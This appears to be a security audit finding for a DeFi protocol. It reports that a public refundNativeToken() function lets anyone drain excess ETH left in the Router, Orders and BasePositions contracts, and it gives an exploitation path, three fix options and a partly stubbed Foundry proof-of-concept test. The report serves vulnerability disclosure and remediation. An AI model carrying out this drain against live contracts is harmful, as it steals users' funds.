## Title
Unprotected `refundNativeToken()` Enables Theft of Accumulated ETH from Router, Orders, and BasePositions Contracts

## Summary
The `refundNativeToken()` function in PayableMulticallable transfers the entire contract balance to any caller without access controls. Router, Orders, and BasePositions contracts accept ETH via payable functions but only transfer exact required amounts to ACCOUNTANT, leaving excess ETH in the contracts. An attacker can call `refundNativeToken()` directly to steal all accumulated ETH from previous users' overpayments.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** The `refundNativeToken()` function is intended to allow users to recover excess ETH they sent in a multicall transaction when exact payment amounts are difficult to calculate in advance (as stated in the comment at line 22-23).

**Actual Logic:** The function has no access controls and transfers the **entire contract balance** to `msg.sender`, regardless of who deposited the ETH or when. This creates a critical vulnerability because:

1. **Router/Orders/BasePositions never validate msg.value** - They accept any amount of ETH via payable functions
2. **Only required amounts are forwarded** - Excess ETH remains in the contract balance
3. **No per-user tracking** - Multiple users' excess ETH accumulates together
4. **Public theft function** - Anyone can call `refundNativeToken()` to drain everything

**Exploitation Path:**

1. **User A calls Router.multihopSwap** with `msg.value = 1 ETH` where the actual swap only needs 0.7 ETH
   - Evidence: [2](#0-1) 
   - Only `totalSpecified` (0.7 ETH) is transferred to ACCOUNTANT
   - 0.3 ETH remains in Router contract balance

2. **User B calls Orders.increaseSellAmount** with `msg.value = 0.5 ETH` where order only needs 0.4 ETH
   - Evidence: [3](#0-2) 
   - Only exact `amount` is transferred to ACCOUNTANT
   - 0.1 ETH remains in Orders contract balance

3. **User C calls BasePositions.deposit** with `msg.value = 0.8 ETH` where deposit only needs 0.6 ETH
   - Evidence: [4](#0-3) 
   - Only `amount0` is transferred to ACCOUNTANT
   - 0.2 ETH remains in BasePositions contract

4. **Attacker calls `Router.refundNativeToken()`** to steal 0.3 ETH, then `Orders.refundNativeToken()` to steal 0.1 ETH, then `BasePositions.refundNativeToken()` to steal 0.2 ETH
   - Total theft: 0.6 ETH from legitimate users

**Security Property Broken:** Direct theft of user funds - violates the fundamental security principle that users should only lose funds through their own explicit actions.

## Impact Explanation

- **Affected Assets**: Native tokens (ETH) sent to Router, Orders, and BasePositions contracts via payable functions
- **Damage Severity**: Attacker can drain **all accumulated excess ETH** from these contracts. In a live protocol, this could accumulate to significant amounts as users overpay for gas estimation safety or due to transaction bundling
- **User Impact**: Any user who sends more ETH than required via `msg.value` loses the excess. This affects:
  - Users calling `multihopSwap()` or `multiMultihopSwap()` where final amounts may differ from estimates
  - Users calling `increaseSellAmount()` for TWAMM orders with ETH
  - Users calling `deposit()` or `mintAndDeposit()` for positions with native tokens
  - Users attempting to use `multicall` with `refundNativeToken` as the last call can be front-run

## Likelihood Explanation

- **Attacker Profile**: Any external actor can exploit this - no special privileges required
- **Preconditions**: 
  - Router/Orders/BasePositions contracts have non-zero ETH balance (accumulates naturally from user overpayments)
  - No time constraints or specific state required
- **Execution Complexity**: Single function call - extremely simple to execute
- **Frequency**: Can be exploited continuously whenever contracts accumulate ETH. Attacker can monitor contract balances and immediately drain any deposits

## Recommendation

The `refundNativeToken()` function must be removed from `PayableMulticallable` or redesigned to be callable only within a multicall context to refund only the caller's excess from the current transaction. The fundamental issue is that msg.value tracking across delegatecalls in multicall is complex and dangerous.

**Option 1: Remove the function entirely**
```solidity
// In src/base/PayableMulticallable.sol:

// REMOVE lines 21-29 completely
// Users must send exact msg.value amounts

// Add validation in Router/Orders/BasePositions:
function swap(...) public payable returns (...) {
    // Before calling lock(), validate msg.value
    if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
        require(msg.value == params.amount(), "Invalid msg.value");
    } else {
        require(msg.value == 0, "No ETH expected");
    }
    // ... rest of function
}
```

**Option 2: Track msg.value per transaction (complex)**
```solidity
// In src/base/PayableMulticallable.sol:

// Add transient storage to track initial balance
uint256 private constant _INITIAL_BALANCE_SLOT = ...;

function multicall(bytes[] calldata data) public payable override returns (bytes[] memory) {
    // Store initial balance before multicall
    uint256 initialBalance = address(this).balance - msg.value;
    assembly {
        tstore(_INITIAL_BALANCE_SLOT, initialBalance)
    }
    
    _multicallDirectReturn(_multicall(data));
}

function refundNativeToken() external payable {
    // Only refund excess from current transaction
    uint256 initialBalance;
    assembly {
        initialBalance := tload(_INITIAL_BALANCE_SLOT)
    }
    require(initialBalance > 0, "Not in multicall");
    
    uint256 excess = address(this).balance - initialBalance;
    if (excess > 0) {
        SafeTransferLib.safeTransferETH(msg.sender, excess);
    }
}
```

**Option 3: Make refundNativeToken internal-only**
```solidity
// In src/base/PayableMulticallable.sol:

// Change from external to internal
function refundNativeToken() internal {
    if (address(this).balance != 0) {
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
    }
}

// Create wrapper that only works at end of multicall
function multicallWithRefund(bytes[] calldata data) external payable returns (bytes[] memory results) {
    results = _multicall(data);
    refundNativeToken();
}
```

**Recommended: Option 1** - Remove the function and require exact msg.value. This is the safest approach and aligns with the comment in FlashAccountant.sol about not being multicallable due to msg.value issues. [5](#0-4) 

## Proof of Concept

```solidity
// File: test/Exploit_RefundNativeTokenTheft.t.sol
// Run with: forge test --match-test test_RefundNativeTokenTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "../src/Orders.sol";
import "../src/Positions.sol";

contract Exploit_RefundNativeTokenTheft is Test {
    Router public router;
    Core public core;
    Orders public orders;
    Positions public positions;
    
    address public victim = address(0x1234);
    address public attacker = address(0x5678);
    
    function setUp() public {
        // Deploy protocol contracts
        core = new Core();
        router = new Router(ICore(address(core)));
        // ... initialize pools, etc.
    }
    
    function test_RefundNativeTokenTheft() public {
        // SETUP: Victim sends excess ETH
        vm.deal(victim, 10 ether);
        vm.startPrank(victim);
        
        // Victim calls multihopSwap with 1 ETH but swap only needs 0.7 ETH
        // (Exact parameters would depend on pool state, simplified for PoC)
        Swap memory swapData; // ... configure swap that needs 0.7 ETH
        router.multihopSwap{value: 1 ether}(swapData, 0);
        
        vm.stopPrank();
        
        // VERIFY: 0.3 ETH remains in Router
        uint256 routerBalance = address(router).balance;
        assertGt(routerBalance, 0, "Router should have excess ETH");
        assertEq(routerBalance, 0.3 ether, "Should be 0.3 ETH excess");
        
        // EXPLOIT: Attacker steals the excess ETH
        vm.startPrank(attacker);
        uint256 attackerBalanceBefore = attacker.balance;
        
        router.refundNativeToken();
        
        uint256 attackerBalanceAfter = attacker.balance;
        
        // VERIFY: Attacker successfully stole victim's excess ETH
        assertEq(address(router).balance, 0, "Router should be drained");
        assertEq(attackerBalanceAfter - attackerBalanceBefore, 0.3 ether, 
            "Attacker stole 0.3 ETH");
        
        vm.stopPrank();
    }
    
    function test_MultipleVictimsAccumulation() public {
        // Multiple users leave excess ETH in contract
        address[] memory victims = new address[](5);
        for (uint i = 0; i < 5; i++) {
            victims[i] = address(uint160(1000 + i));
            vm.deal(victims[i], 1 ether);
            vm.prank(victims[i]);
            // Each victim leaves 0.1 ETH excess
            // ... call functions that leave 0.1 ETH
        }
        
        // Attacker drains all accumulated ETH
        uint256 totalAccumulated = address(router).balance;
        assertEq(totalAccumulated, 0.5 ether, "Should have 0.5 ETH accumulated");
        
        vm.prank(attacker);
        router.refundNativeToken();
        
        assertEq(attacker.balance, 0.5 ether, "Attacker stole all accumulated ETH");
        assertEq(address(router).balance, 0, "Router drained");
    }
}
```

### Citations

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Router.sol (L229-230)
```text
                    if (specifiedToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(totalSpecified)));
```

**File:** src/Orders.sol (L147-148)
```text
                    if (sellToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
```

**File:** src/base/BasePositions.sol (L256-257)
```text
                if (amount0 != 0) {
                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
```

**File:** src/base/FlashAccountant.sol (L387-388)
```text
        // Note because we use msg.value here, this contract can never be multicallable, i.e. it should never expose the ability
        //      to delegatecall itself more than once in a single call
```
